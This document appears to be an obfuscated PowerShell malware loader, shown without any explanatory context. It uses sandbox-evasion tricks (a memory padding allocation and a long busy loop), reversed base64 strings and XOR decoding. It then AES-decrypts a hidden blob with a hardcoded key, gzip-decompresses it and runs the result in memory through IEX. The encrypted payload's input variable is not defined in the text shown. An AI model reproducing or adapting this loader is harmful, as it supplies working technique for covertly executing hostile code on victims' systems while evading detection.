$qoghshgiimpor = (Get-Process -Id $PID | Select-Object Name,@{Name="WorkingSet";Expression={($_.ws / 1024kb)}}).WorkingSet
if ($qoghshgiimpor -lt 250) { $smzrjwymzixuo = "a" * 300MB }
$ornjjnppnyxu = 0
$rizmzupuyssygj = 30000000
For ($ornjjnppnyxu=0; $ornjjnppnyxu -lt $rizmzupuyssygj;$ornjjnppnyxu++) { $ornjjnppnyxu++ }
$sqohnytnoio = [System.Text.Encoding]::UTF8.GetBytes("rnhgiqpynhs")
$vjzhzxqzqnni = [System.Text.Encoding]::UTF8.GetBytes($xorghugmgowo)
$kqtpgywuppvhvprig = $(for ($oqipwptsjrjs = 0; $oqipwptsjrjs -lt $vjzhzxqzqnni.length; ) {
    for ($jjtxnrxpmoknxo = 0; $jjtxnrxpmoknxo -lt $sqohnytnoio.length; $jjtxnrxpmoknxo++) {
        $vjzhzxqzqnni[$oqipwptsjrjs] -bxor $sqohnytnoio[$jjtxnrxpmoknxo]
        $oqipwptsjrjs++
        if ($oqipwptsjrjs -ge $vjzhzxqzqnni.Length) {
            $jjtxnrxpmoknxo = $sqohnytnoio.length
        }
    }
})
$kqtpgywuppvhvprig = [System.Text.Encoding]::UTF8.GetString($kqtpgywuppvhvprig)
$qyuvqgzwnxwxnryyg = "$kqtpgywuppvhvprig"
$gxvzwwruzmutgx = $qyuvqgzwnxwxnryyg.ToCharArray()
[array]::Reverse($gxvzwwruzmutgx)
$zwrpztrqvmqrjhq = -join($gxvzwwruzmutgx)
$pvxnmpupsgrqusrvr = [System.Convert]::FromBase64String("$zwrpztrqvmqrjhq")
$oryxjmxoxhxmyqv = [System.Convert]::FromBase64String("MYfrEGt5bFA4i8xEfa7hAjwCEx5AYRcp0r0ZJCq9B8k=")
$nvmmvhjnnumskqqm = "==gCkV2Zh5WYNNXZB5SeoBXYyd2b0BXeyNkL5RXayV3YlNlLtVGdzl3U"
$kzrwxputjqwovtpvz = $nvmmvhjnnumskqqm.ToCharArray()
[array]::Reverse($kzrwxputjqwovtpvz)
$qyimmktozi = -join($kzrwxputjqwovtpvz)
$zhxnwoxtsp = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($qyimmktozi))
$twpvophphg = New-Object "$zhxnwoxtsp"
$sghpzryxmxsoh = "==gQDVkO60VZk9WTyVGawl2QukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5N1W"
$vtyoiohqiywyxm = $sghpzryxmxsoh.ToCharArray()
[array]::Reverse($vtyoiohqiywyxm)
$pouyoiuuqizrokz = -join($vtyoiohqiywyxm)
$mwyhkmxpqoo = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($pouyoiuuqizrokz))
$sgytvkkpoiqnq = & ([scriptblock]::Create($mwyhkmxpqoo))
$twpvophphg.Mode = $sgytvkkpoiqnq
$xhpnuokxmjhiostv = "==gNyEDMx80UJpjOdVGZv10ZulGZkFGUukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5N1W"
$wpjgupiwtrgpmz = $xhpnuokxmjhiostv.ToCharArray()
[array]::Reverse($wpjgupiwtrgpmz)
$uxgtzgmwirojyjn = -join($wpjgupiwtrgpmz)
$uwqmmomooynh = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($uxgtzgmwirojyjn))
$jgtnxjhijywgyrwx = & ([scriptblock]::Create($uwqmmomooynh))
$twpvophphg.Padding = $jgtnxjhijywgyrwx
$twpvophphg.BlockSize = 128
$twpvophphg.KeySize = 256
$twpvophphg.Key = $oryxjmxoxhxmyqv
$twpvophphg.IV = $pvxnmpupsgrqusrvr[0..15]
$tmkhniqimxujqtos = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3lzdGVtLklPLk1lbW9yeVN0cmVhbQ=="))
$ororpkhujsjmkts = New-Object $tmkhniqimxujqtos(,$twpvophphg.CreateDecryptor().TransformFinalBlock($pvxnmpupsgrqusrvr,16,$pvxnmpupsgrqusrvr.Length-16))
$shgqnzmyryzy = New-Object $tmkhniqimxujqtos
$kzsprihgwhikj = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RGVjb21wcmVzcw=="))
$ygtpyjmyomp = & ([scriptblock]::Create([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0lPLkNvbXByZXNzaW9uLkNvbXByZXNzaW9uTW9kZV0="))))
$nnsnizzsxisw = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3lzdGVtLklPLkNvbXByZXNzaW9uLkd6aXBTdHJlYW0="))
$kkwxkoougjtuoo = New-Object $nnsnizzsxisw $ororpkhujsjmkts, ($ygtpyjmyomp::$kzsprihgwhikj)
$kkwxkoougjtuoo.CopyTo($shgqnzmyryzy)
$kkwxkoougjtuoo.Close()
$twpvophphg.Dispose()
$ororpkhujsjmkts.Close()
$grrmvqvzgugzxzi = & ([scriptblock]::Create([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W1N5c3RlbS5UZXh0LkVuY29kaW5nXQ=="))))
$oyywxhqmhjgw = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VVRGOA=="))
$ygiuspkgikkvxtu = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9BcnJheQ=="))
$qhwmjqgvottvpzg = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R2V0U3RyaW5n"))
$ngqhpiwznnwyjov = $grrmvqvzgugzxzi::$oyywxhqmhjgw.$qhwmjqgvottvpzg($shgqnzmyryzy.$ygiuspkgikkvxtu())
IEX($ngqhpiwznnwyjov)